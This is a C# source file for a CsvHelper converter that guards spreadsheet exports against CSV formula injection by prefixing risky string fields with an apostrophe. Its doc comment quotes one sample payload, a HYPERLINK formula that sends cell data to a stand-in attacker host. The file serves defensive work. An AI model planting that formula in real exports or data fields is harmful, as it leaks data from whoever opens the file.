using System;
using System.Globalization;
using CsvHelper;
using CsvHelper.Configuration;
using CsvHelper.TypeConversion;

namespace Foundry.FileIO;

/// <summary>
/// Writes string fields so that a spreadsheet displays them instead of evaluating them.
/// </summary>
/// <remarks>
/// <para>
/// CSV formula injection: Excel, LibreOffice and Google Sheets evaluate a cell whose text begins
/// with <c>=</c>, <c>+</c>, <c>@</c>, <c>-</c>, a tab or a carriage return. A user who types
/// <c>=HYPERLINK("http://attacker/?d="&amp;A1,"click")</c> into a name field therefore gets it
/// executed in the session of whoever opens the export, which turns an ordinary data export into a
/// delivery mechanism for exfiltration. Nothing in the export pipeline reports it — the file is
/// valid CSV and the value round-trips perfectly.
/// </para>
/// <para>
/// Applied only to <see cref="string"/> fields, so numeric and date columns are untouched by
/// construction; a negative <c>decimal</c> is never mistaken for a formula. A string that parses as
/// a number is also left alone, which keeps numeric-looking identifiers intact.
/// </para>
/// <para>
/// The mitigation is a leading apostrophe, which spreadsheets consume as a "treat as text" marker
/// rather than displaying, so the cell still reads as the original value.
/// </para>
/// </remarks>
public sealed class FormulaSafeStringConverter : StringConverter
{
    private static readonly char[] FormulaTriggers = ['=', '+', '@', '\t', '\r'];

    /// <inheritdoc />
    public override string? ConvertToString(object? value, IWriterRow row, MemberMapData memberMapData)
    {
        var text = base.ConvertToString(value, row, memberMapData);
        return Neutralise(text);
    }

    /// <summary>
    /// Returns <paramref name="text"/> prefixed with an apostrophe when a spreadsheet would evaluate
    /// it as a formula.
    /// </summary>
    internal static string? Neutralise(string? text)
    {
        if (string.IsNullOrEmpty(text)) return text;

        var first = text[0];

        if (Array.IndexOf(FormulaTriggers, first) >= 0)
        {
            return "'" + text;
        }

        // '-' is a formula trigger but also the start of every negative number, so a value that
        // parses as a number is left as it is.
        if (first == '-'
            && !double.TryParse(text, NumberStyles.Any, CultureInfo.InvariantCulture, out _))
        {
            return "'" + text;
        }

        return text;
    }
}
